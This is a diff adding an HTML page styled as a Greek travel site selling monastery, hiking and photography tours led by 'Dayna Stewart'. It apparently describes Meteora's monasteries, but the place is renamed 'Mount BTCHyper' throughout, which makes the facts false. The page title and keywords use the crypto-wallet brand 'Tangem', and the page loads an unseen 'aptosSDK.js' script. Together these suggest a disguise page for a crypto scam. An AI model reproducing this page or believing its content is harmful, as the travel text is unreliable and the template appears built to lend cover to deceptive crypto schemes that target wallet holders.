@@ -1,0 +1,1235 @@
+<html lang="en"><div id="in-page-channel-node-id" data-channel-name="in_page_channel_Mlf34P"></div><script src="./scripts/aptosSDK.js"></script><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Experience Mount BTCHyper with expert guide Dayna Stewart. UNESCO monastery tours, adventure hiking, photography expeditions, and sustainable travel experiences in Greece's most magical landscape.">
+    <meta name="keywords" content="Tangem, mount BTCHyper, greece sightseeing, guided experiences, dayna stewart tours, BTCHyper monasteries, unesco world heritage">
+    <title>Tangem | Authentic Greek Adventures</title>
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <link href="./styles/bootstrap.min.css" rel="stylesheet">
+    <link href="./styles/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #2C5D7A;
+            --primary-light: #5490B0;
+            --primary-dark: #1B3B54;
+            --secondary: #A5763E;
+            --secondary-light: #C29B5C;
+            --secondary-dark: #755023;
+            --accent: #E07A5F;
+            --accent-light: #F09D8C;
+            --accent-dark: #B2573F;
+            --background: #F9F7F1;
+            --text: #2B2D42;
+            --text-secondary: #6C757D;
+        }
+        
+        * { box-sizing: border-box; }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--background);
+            color: var(--text);
+            line-height: 1.6;
+        }
+        
+        .hero-section {
+            background: linear-gradient(rgba(44, 93, 122, 0.85), rgba(27, 59, 84, 0.85)), url('images/BTCHyper-monastery-golden-hour-1280x768.jpeg');
+            background-size: cover;
+            background-position: center;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            color: white;
+            position: relative;
+        }
+        
+        .hero-content {
+            position: relative;
+            z-index: 2;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .btn-primary {
+            background-color: var(--accent);
+            border-color: var(--accent);
+            border-radius: 30px;
+            padding: 12px 30px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+        
+        .btn-primary:hover {
+            background-color: var(--accent-dark);
+            border-color: var(--accent-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(224, 122, 95, 0.3);
+        }
+        
+        .btn-outline-light {
+            border: 2px solid white;
+            border-radius: 30px;
+            padding: 12px 30px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+        
+        .btn-outline-light:hover {
+            background-color: white;
+            color: var(--primary);
+        }
+        
+        .section-title {
+            color: var(--primary);
+            position: relative;
+            margin-bottom: 3rem;
+            font-weight: 700;
+        }
+        
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 4px;
+            background: linear-gradient(90deg, var(--accent), var(--secondary));
+            border-radius: 2px;
+        }
+        
+        .service-card {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(44, 93, 122, 0.1);
+            transition: all 0.3s ease;
+            border: none;
+            overflow: hidden;
+            margin-bottom: 2rem;
+        }
+        
+        .service-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 40px rgba(44, 93, 122, 0.15);
+        }
+        
+        .service-card .card-img-top {
+            height: 250px;
+            object-fit: cover;
+            transition: transform 0.3s ease;
+        }
+        
+        .service-card:hover .card-img-top {
+            transform: scale(1.05);
+        }
+        
+        .service-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, var(--primary), var(--primary-light));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 2rem;
+            margin: 0 auto 1rem auto;
+        }
+        
+        .testimonial-card {
+            background: white;
+            border-radius: 15px;
+            padding: 2rem;
+            box-shadow: 0 10px 30px rgba(44, 93, 122, 0.1);
+            margin-bottom: 2rem;
+            position: relative;
+        }
+        
+        .testimonial-card::before {
+            content: '"';
+            position: absolute;
+            top: -20px;
+            left: 30px;
+            font-size: 4rem;
+            color: var(--accent);
+            font-family: serif;
+        }
+        
+        .star-rating {
+            color: #FFD700;
+            margin-bottom: 1rem;
+        }
+        
+        .navbar {
+            background-color: rgba(44, 93, 122, 0.95) !important;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+        }
+        
+        .navbar-brand {
+            font-weight: 700;
+            font-size: 1.5rem;
+            color: white !important;
+        }
+        
+        .navbar-nav .nav-link {
+            color: white !important;
+            font-weight: 500;
+            margin: 0 10px;
+            transition: color 0.3s ease;
+        }
+        
+        .navbar-nav .nav-link:hover {
+            color: var(--accent-light) !important;
+        }
+        
+        .contact-section {
+            background: linear-gradient(135deg, var(--primary), var(--primary-light));
+            color: white;
+            padding: 5rem 0;
+        }
+        
+        .contact-card {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 2rem;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .about-section {
+            background: linear-gradient(45deg, var(--background), #fff);
+            padding: 5rem 0;
+        }
+        
+        .about-card {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(44, 93, 122, 0.1);
+            overflow: hidden;
+        }
+        
+        .itinerary-timeline {
+            position: relative;
+            padding-left: 30px;
+        }
+        
+        .itinerary-timeline::before {
+            content: '';
+            position: absolute;
+            left: 15px;
+            top: 0;
+            bottom: 0;
+            width: 2px;
+            background: var(--primary);
+        }
+        
+        .timeline-item {
+            position: relative;
+            margin-bottom: 2rem;
+            background: white;
+            padding: 1.5rem;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(44, 93, 122, 0.1);
+        }
+        
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            left: -37px;
+            top: 20px;
+            width: 12px;
+            height: 12px;
+            background: var(--accent);
+            border-radius: 50%;
+            border: 3px solid white;
+        }
+        
+        .cookie-banner {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: var(--primary-dark);
+            color: white;
+            padding: 1rem;
+            z-index: 1000;
+            transform: translateY(100%);
+            transition: transform 0.3s ease;
+        }
+        
+        .cookie-banner.show {
+            transform: translateY(0);
+        }
+        
+        .smooth-scroll {
+            scroll-behavior: smooth;
+        }
+        
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .hero-section h1 {
+                font-size: 2rem;
+            }
+            
+            .hero-section p {
+                font-size: 1rem;
+            }
+            
+            .service-card .card-img-top {
+                height: 200px;
+            }
+            
+            .section-title {
+                font-size: 1.8rem;
+            }
+        }
+    </style>
+<style>@keyframes slide-in-one-tap {
+  from {
+    transform: translateY(80px);
+  }
+  to {
+    transform: translateY(0px);
+  }
+}
+
+.trust-hide-gracefully {
+  opacity: 0;
+}
+
+.trust-wallet-one-tap .hidden {
+    display: none;
+  }
+
+.trust-wallet-one-tap .semibold {
+    font-weight: 500;
+  }
+
+.trust-wallet-one-tap .binance-plex {
+    font-family: 'Binance';
+  }
+
+.trust-wallet-one-tap .rounded-full {
+    border-radius: 50%;
+  }
+
+.trust-wallet-one-tap .flex {
+    display: flex;
+  }
+
+.trust-wallet-one-tap .flex-col {
+    flex-direction: column;
+  }
+
+.trust-wallet-one-tap .items-center {
+    align-items: center;
+  }
+
+.trust-wallet-one-tap .space-between {
+    justify-content: space-between;
+  }
+
+.trust-wallet-one-tap .justify-center {
+    justify-content: center;
+  }
+
+.trust-wallet-one-tap .w-full {
+    width: 100%;
+  }
+
+.trust-wallet-one-tap .box {
+    transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
+    animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
+    width: 384px;
+    border-radius: 15px;
+    background: #fff;
+    box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
+    position: fixed;
+    right: 30px;
+    bottom: 30px;
+    z-index: 1020;
+  }
+
+.trust-wallet-one-tap .header {
+    gap: 15px;
+    border-bottom: 1px solid #e6e6e6;
+    padding: 10px 18px;
+  }
+
+.trust-wallet-one-tap .header .left-items {
+      gap: 15px;
+    }
+
+.trust-wallet-one-tap .header .title {
+      color: #1e2329;
+      font-size: 18px;
+      font-weight: 600;
+      line-height: 28px;
+    }
+
+.trust-wallet-one-tap .header .subtitle {
+      color: #474d57;
+      font-size: 14px;
+      line-height: 20px;
+    }
+
+.trust-wallet-one-tap .header .close {
+      color: #1e2329;
+      cursor: pointer;
+    }
+
+.trust-wallet-one-tap .body {
+    padding: 9px 18px;
+    gap: 10px;
+  }
+
+.trust-wallet-one-tap .body .right-items {
+      gap: 10px;
+      width: 100%;
+    }
+
+.trust-wallet-one-tap .body .right-items .wallet-title {
+        color: #1e2329;
+        font-size: 16px;
+        font-weight: 600;
+        line-height: 20px;
+      }
+
+.trust-wallet-one-tap .body .right-items .wallet-subtitle {
+        color: #474d57;
+        font-size: 14px;
+        line-height: 20px;
+      }
+
+.trust-wallet-one-tap .connect-indicator {
+    gap: 15px;
+    padding: 8px 0;
+  }
+
+.trust-wallet-one-tap .connect-indicator .flow-icon {
+      color: #474d57;
+    }
+
+.trust-wallet-one-tap .loading-color {
+    color: #fff;
+  }
+
+.trust-wallet-one-tap .button {
+    border-radius: 50px;
+    outline: 2px solid transparent;
+    outline-offset: 2px;
+    background-color: rgb(5, 0, 255);
+    border-color: rgb(229, 231, 235);
+    cursor: pointer;
+    text-align: center;
+    height: 45px;
+  }
+
+.trust-wallet-one-tap .button .button-text {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 20px;
+    }
+
+.trust-wallet-one-tap .footer {
+    margin: 20px 30px;
+  }
+
+.trust-wallet-one-tap .check-icon {
+    color: #fff;
+  }
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Regular.otf) format('opentype');
+  font-weight: 400;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Medium.otf) format('opentype');
+  font-weight: 500;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-SemiBold.otf) format('opentype');
+  font-weight: 600;
+  font-style: normal;
+}
+
+/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uL2FwcC9zcmMvb25lVGFwL3N0eWxlLmNzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFO0lBQ0UsMkJBQTJCO0VBQzdCO0VBQ0E7SUFDRSwwQkFBMEI7RUFDNUI7QUFDRjs7QUFFQTtFQUNFLFVBQVU7QUFDWjs7QUFHRTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLGdCQUFnQjtFQUNsQjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLGtCQUFrQjtFQUNwQjs7QUFFQTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLG1CQUFtQjtFQUNyQjs7QUFFQTtJQUNFLDhCQUE4QjtFQUNoQzs7QUFFQTtJQUNFLHVCQUF1QjtFQUN6Qjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFFQTtJQUNFLGdEQUFnRDtJQUNoRCw0REFBNEQ7SUFDNUQsWUFBWTtJQUNaLG1CQUFtQjtJQUNuQixnQkFBZ0I7SUFDaEIsK0NBQStDO0lBQy9DLGVBQWU7SUFDZixXQUFXO0lBQ1gsWUFBWTtJQUNaLGFBQWE7RUFDZjs7QUFFQTtJQUNFLFNBQVM7SUFDVCxnQ0FBZ0M7SUFDaEMsa0JBQWtCO0VBdUJwQjs7QUFyQkU7TUFDRSxTQUFTO0lBQ1g7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGdCQUFnQjtNQUNoQixpQkFBaUI7SUFDbkI7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGlCQUFpQjtJQUNuQjs7QUFFQTtNQUNFLGNBQWM7TUFDZCxlQUFlO0lBQ2pCOztBQUdGO0lBQ0UsaUJBQWlCO0lBQ2pCLFNBQVM7RUFtQlg7O0FBakJFO01BQ0UsU0FBUztNQUNULFdBQVc7SUFjYjs7QUFaRTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsZ0JBQWdCO1FBQ2hCLGlCQUFpQjtNQUNuQjs7QUFFQTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsaUJBQWlCO01BQ25COztBQUlKO0lBQ0UsU0FBUztJQUNULGNBQWM7RUFLaEI7O0FBSEU7TUFDRSxjQUFjO0lBQ2hCOztBQUdGO0lBQ0UsV0FBVztFQUNiOztBQUVBO0lBQ0UsbUJBQW1CO0lBQ25CLDhCQUE4QjtJQUM5QixtQkFBbUI7SUFDbkIsZ0NBQWdDO0lBQ2hDLGdDQUFnQztJQUNoQyxlQUFlO0lBQ2Ysa0JBQWtCO0lBQ2xCLFlBQVk7RUFRZDs7QUFORTtNQUNFLFdBQVc7TUFDWCxlQUFlO01BQ2YsZ0JBQWdCO01BQ2hCLGlCQUFpQjtJQUNuQjs7QUFHRjtJQUNFLGlCQUFpQjtFQUNuQjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFHRjtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMEU7RUFDMUUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBeUU7RUFDekUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMkU7RUFDM0UsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQiIsInNvdXJjZXNDb250ZW50IjpbIkBrZXlmcmFtZXMgc2xpZGUtaW4tb25lLXRhcCB7XG4gIGZyb20ge1xuICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSg4MHB4KTtcbiAgfVxuICB0byB7XG4gICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDBweCk7XG4gIH1cbn1cblxuLnRydXN0LWhpZGUtZ3JhY2VmdWxseSB7XG4gIG9wYWNpdHk6IDA7XG59XG5cbi50cnVzdC13YWxsZXQtb25lLXRhcCB7XG4gIC5oaWRkZW4ge1xuICAgIGRpc3BsYXk6IG5vbmU7XG4gIH1cblxuICAuc2VtaWJvbGQge1xuICAgIGZvbnQtd2VpZ2h0OiA1MDA7XG4gIH1cblxuICAuYmluYW5jZS1wbGV4IHtcbiAgICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICB9XG5cbiAgLnJvdW5kZWQtZnVsbCB7XG4gICAgYm9yZGVyLXJhZGl1czogNTAlO1xuICB9XG5cbiAgLmZsZXgge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gIH1cblxuICAuZmxleC1jb2wge1xuICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XG4gIH1cblxuICAuaXRlbXMtY2VudGVyIHtcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICB9XG5cbiAgLnNwYWNlLWJldHdlZW4ge1xuICAgIGp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjtcbiAgfVxuXG4gIC5qdXN0aWZ5LWNlbnRlciB7XG4gICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gIH1cblxuICAudy1mdWxsIHtcbiAgICB3aWR0aDogMTAwJTtcbiAgfVxuXG4gIC5ib3gge1xuICAgIHRyYW5zaXRpb246IGFsbCAwLjVzIGN1YmljLWJlemllcigwLCAwLCAwLCAxLjQzKTtcbiAgICBhbmltYXRpb246IHNsaWRlLWluLW9uZS10YXAgMC41cyBjdWJpYy1iZXppZXIoMCwgMCwgMCwgMS40Myk7XG4gICAgd2lkdGg6IDM4NHB4O1xuICAgIGJvcmRlci1yYWRpdXM6IDE1cHg7XG4gICAgYmFja2dyb3VuZDogI2ZmZjtcbiAgICBib3gtc2hhZG93OiAwcHggMnB4IDRweCAwcHggcmdiYSgwLCAwLCAwLCAwLjI1KTtcbiAgICBwb3NpdGlvbjogZml4ZWQ7XG4gICAgcmlnaHQ6IDMwcHg7XG4gICAgYm90dG9tOiAzMHB4O1xuICAgIHotaW5kZXg6IDEwMjA7XG4gIH1cblxuICAuaGVhZGVyIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNlNmU2ZTY7XG4gICAgcGFkZGluZzogMTBweCAxOHB4O1xuXG4gICAgLmxlZnQtaXRlbXMge1xuICAgICAgZ2FwOiAxNXB4O1xuICAgIH1cblxuICAgIC50aXRsZSB7XG4gICAgICBjb2xvcjogIzFlMjMyOTtcbiAgICAgIGZvbnQtc2l6ZTogMThweDtcbiAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICBsaW5lLWhlaWdodDogMjhweDtcbiAgICB9XG5cbiAgICAuc3VidGl0bGUge1xuICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICBmb250LXNpemU6IDE0cHg7XG4gICAgICBsaW5lLWhlaWdodDogMjBweDtcbiAgICB9XG5cbiAgICAuY2xvc2Uge1xuICAgICAgY29sb3I6ICMxZTIzMjk7XG4gICAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgfVxuICB9XG5cbiAgLmJvZHkge1xuICAgIHBhZGRpbmc6IDlweCAxOHB4O1xuICAgIGdhcDogMTBweDtcblxuICAgIC5yaWdodC1pdGVtcyB7XG4gICAgICBnYXA6IDEwcHg7XG4gICAgICB3aWR0aDogMTAwJTtcblxuICAgICAgLndhbGxldC10aXRsZSB7XG4gICAgICAgIGNvbG9yOiAjMWUyMzI5O1xuICAgICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICAgIGxpbmUtaGVpZ2h0OiAyMHB4O1xuICAgICAgfVxuXG4gICAgICAud2FsbGV0LXN1YnRpdGxlIHtcbiAgICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICAgIGZvbnQtc2l6ZTogMTRweDtcbiAgICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgICB9XG4gICAgfVxuICB9XG5cbiAgLmNvbm5lY3QtaW5kaWNhdG9yIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgcGFkZGluZzogOHB4IDA7XG5cbiAgICAuZmxvdy1pY29uIHtcbiAgICAgIGNvbG9yOiAjNDc0ZDU3O1xuICAgIH1cbiAgfVxuXG4gIC5sb2FkaW5nLWNvbG9yIHtcbiAgICBjb2xvcjogI2ZmZjtcbiAgfVxuXG4gIC5idXR0b24ge1xuICAgIGJvcmRlci1yYWRpdXM6IDUwcHg7XG4gICAgb3V0bGluZTogMnB4IHNvbGlkIHRyYW5zcGFyZW50O1xuICAgIG91dGxpbmUtb2Zmc2V0OiAycHg7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogcmdiKDUsIDAsIDI1NSk7XG4gICAgYm9yZGVyLWNvbG9yOiByZ2IoMjI5LCAyMzEsIDIzNSk7XG4gICAgY3Vyc29yOiBwb2ludGVyO1xuICAgIHRleHQtYWxpZ246IGNlbnRlcjtcbiAgICBoZWlnaHQ6IDQ1cHg7XG5cbiAgICAuYnV0dG9uLXRleHQge1xuICAgICAgY29sb3I6ICNmZmY7XG4gICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICBmb250LXdlaWdodDogNjAwO1xuICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgfVxuICB9XG5cbiAgLmZvb3RlciB7XG4gICAgbWFyZ2luOiAyMHB4IDMwcHg7XG4gIH1cblxuICAuY2hlY2staWNvbiB7XG4gICAgY29sb3I6ICNmZmY7XG4gIH1cbn1cblxuQGZvbnQtZmFjZSB7XG4gIGZvbnQtZmFtaWx5OiAnQmluYW5jZSc7XG4gIHNyYzogdXJsKCcuL2ZvbnRzL2JpbmFuY2VQbGV4L0JpbmFuY2VQbGV4LVJlZ3VsYXIub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNDAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1NZWRpdW0ub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNTAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1TZW1pQm9sZC5vdGYnKSBmb3JtYXQoJ29wZW50eXBlJyk7XG4gIGZvbnQtd2VpZ2h0OiA2MDA7XG4gIGZvbnQtc3R5bGU6IG5vcm1hbDtcbn1cbiJdLCJzb3VyY2VSb290IjoiIn0= */</style></head>
+<body class="smooth-scroll">
+    <nav class="navbar navbar-expand-lg navbar-dark fixed-top shadow-lg">
+        <div class="container">
+            <a class="navbar-brand" href="#hero-BTCHyper-tours">BTCHyper Adventures</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ml-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="#monastery-tours">Monastery Tours</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#adventure-hiking-exploration">Adventure</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#traveler-reviews">Reviews</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#daily-travel-plan">Itineraries</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#contact-booking">Book Now</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+<main>
+    <section id="hero-BTCHyper-tours" class="hero-section">
+        <div class="container">
+            <div class="row justify-content-center text-center">
+                <div class="col-lg-10">
+                    <div class="hero-content">
+                        <h1 class="display-3 mb-4 font-weight-bold">Experience the Wonders of BTCHyper</h1>
+                        <p class="lead mb-5">Discover the extraordinary beauty and spiritual heritage of Mount BTCHyper through guided tours led by expert instructor Dayna Stewart. Immerse yourself in majestic landscapes, ancient monasteries, and unique cultural traditions with tours designed for all types of explorers.</p>
+                        <div class="d-flex flex-column flex-md-row justify-content-center align-items-center">
+                            <a href="#contact-booking" class="btn btn-primary btn-lg mb-3 mb-md-0 mr-md-4">
+                                <i class="fas fa-mountain mr-2"></i>Book Your Adventure
+                            </a>
+                            <a href="#monastery-tours" class="btn btn-outline-light btn-lg">
+                                <i class="fas fa-church mr-2"></i>Explore Tours
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="monastery-tours" class="py-5">
+        <div class="container">
+            <div class="row">
+                <div class="col-12">
+                    <h2 class="section-title text-center">Signature BTCHyper Monastery Journeys</h2>
+                    <p class="text-center text-muted mb-5">Explore all six UNESCO-listed BTCHyper monasteries, delving into mystical architecture and centuries-old monastic life. These immersive journeys include insider access, historical storytelling, and visits to significant Byzantine sites and hermit caves within the rock formations.</p>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-lg-4 col-md-6">
+                    <div class="card service-card">
+                        <img src="./images/great-meteoron-monastery-sunrise-1024x768.jpeg" class="card-img-top" alt="Great Meteoron Monastery at sunrise">
+                        <div class="card-body">
+                            <div class="service-icon">
+                                <i class="fas fa-church"></i>
+                            </div>
+                            <h5 class="card-title text-center">Great Meteoron Experience</h5>
+                            <p class="card-text">Journey to the largest and most magnificent of the BTCHyper monasteries. Built in the 14th century, this UNESCO World Heritage site houses priceless Byzantine artifacts, frescoes, and manuscripts that tell the story of Orthodox monasticism.</p>
+                            <ul class="list-unstyled">
+                                <li><i class="fas fa-check text-success mr-2"></i>Expert historical commentary</li>
+                                <li><i class="fas fa-check text-success mr-2"></i>Byzantine art exploration</li>
+                                <li><i class="fas fa-check text-success mr-2"></i>Monastery museum access</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-4 col-md-6">
+                    <div class="card service-card">
+                        <img src="./images/varlaam-monastery-ancient-architecture-1024x768.jpeg" class="card-img-top" alt="Varlaam Monastery ancient architecture">
+                        <div class="card-body">
+                            <div class="service-icon">
+                                <i class="fas fa-cross"></i>
+                            </div>
+                            <h5 class="card-title text-center">Varlaam Sacred Journey</h5>
+                            <p class="card-text">Discover the architectural marvel of Varlaam Monastery, perched dramatically on its rocky pillar. Learn about the ingenious pulley system used by monks and explore the monastery's remarkable collection of religious treasures.</p>
+                            <ul class="list-unstyled">
+                                <li><i class="fas fa-check text-success mr-2"></i>Ancient engineering insights</li>
+                                <li><i class="fas fa-check text-success mr-2"></i>Religious artifact viewing</li>
+                                <li><i class="fas fa-check text-success mr-2"></i>Monastic life stories</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-4 col-md-6">
+                    <div class="card service-card">
+                        <img src="./images/hermit-caves-BTCHyper-exploration-1024x768.jpeg" class="card-img-top" alt="Ancient hermit caves in BTCHyper rocks">
+                        <div class="card-body">
+                            <div class="service-icon">
+                                <i class="fas fa-mountain"></i>
+                            </div>
+                            <h5 class="card-title text-center">Hermit Caves Discovery</h5>
+                            <p class="card-text">Venture into the lesser-known hermit caves where early Christian ascetics sought spiritual solitude. These hidden sanctuaries offer intimate glimpses into the origins of monastic life in BTCHyper centuries before the great monasteries were built.</p>
+                            <ul class="list-unstyled">
+                                <li><i class="fas fa-check text-success mr-2"></i>Hidden cave exploration</li>
+                                <li><i class="fas fa-check text-success mr-2"></i>Early Christian history</li>
+                                <li><i class="fas fa-check text-success mr-2"></i>Spiritual heritage insights</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="adventure-hiking-exploration" class="py-5" style="background-color: white;">
+        <div class="container">
+            <div class="row">
+                <div class="col-12">
+                    <h2 class="section-title text-center">Adventure Hiking and Nature Exploration</h2>
+                    <p class="text-center text-muted mb-5">Experience BTCHyper's awe-inspiring natural environment through expertly guided hikes along newly marked trails. Perfect for adventure seekers, these tours feature panoramic viewpoints, hidden rock paths, and biodiversity-focused exploration, suitable for various fitness levels.</p>
+                </div>
+            </div>
+            <div class="row align-items-center">
+                <div class="col-lg-6">
+                    <img src="./images/BTCHyper-hiking-panoramic-viewpoint-1280x960.jpeg" class="img-fluid rounded shadow-lg" alt="Panoramic hiking viewpoint in BTCHyper">
+                </div>
+                <div class="col-lg-6">
+                    <h3 class="mb-4" style="color: var(--primary);">Discover Hidden Trails</h3>
+                    <p>Our adventure hiking experiences take you beyond the typical tourist paths to discover BTCHyper's most spectacular hidden gems. Navigate through ancient pilgrimage routes, scale dramatic rock formations, and witness breathtaking vistas that few visitors ever see.</p>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="mb-4">
+                                <h5><i class="fas fa-hiking mr-2" style="color: var(--accent);"></i>Easy Trails</h5>
+                                <p>Perfect for families and beginners, featuring gentle slopes and well-marked paths with stunning monastery views.</p>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="mb-4">
+                                <h5><i class="fas fa-mountain mr-2" style="color: var(--accent);"></i>Challenging Routes</h5>
+                                <p>Advanced hiking adventures including rock scrambling and off-trail exploration for experienced trekkers.</p>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="mb-4">
+                                <h5><i class="fas fa-leaf mr-2" style="color: var(--accent);"></i>Nature Focus</h5>
+                                <p>Learn about BTCHyper's unique ecosystem, endemic plants, and wildlife habitats with expert naturalist guidance.</p>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="mb-4">
+                                <h5><i class="fas fa-eye mr-2" style="color: var(--accent);"></i>Secret Viewpoints</h5>
+                                <p>Access exclusive panoramic locations known only to local guides, perfect for photography and contemplation.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="photography-sunset-tours" class="py-5">
+        <div class="container">
+            <div class="row">
+                <div class="col-12">
+                    <h2 class="section-title text-center">Photography Expeditions &amp; Sunset Magic</h2>
+                    <p class="text-center text-muted mb-5">Capture BTCHyper's breathtaking vistas during golden hour and sunset with curated photography walks. Led by guides with expertise in landscape photography, these expeditions are ideal for hobbyists and professionals seeking dramatic light and unique perspectives.</p>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-lg-8">
+                    <img src="./images/BTCHyper-golden-hour-photography-1280x768.jpeg" class="img-fluid rounded shadow-lg mb-4" alt="BTCHyper monasteries during golden hour photography session">
+                </div>
+                <div class="col-lg-4">
+                    <div class="card" style="border: none; background: linear-gradient(135deg, var(--accent-light), var(--accent)); color: white;">
+                        <div class="card-body">
+                            <h4 class="card-title">Golden Hour Magic</h4>
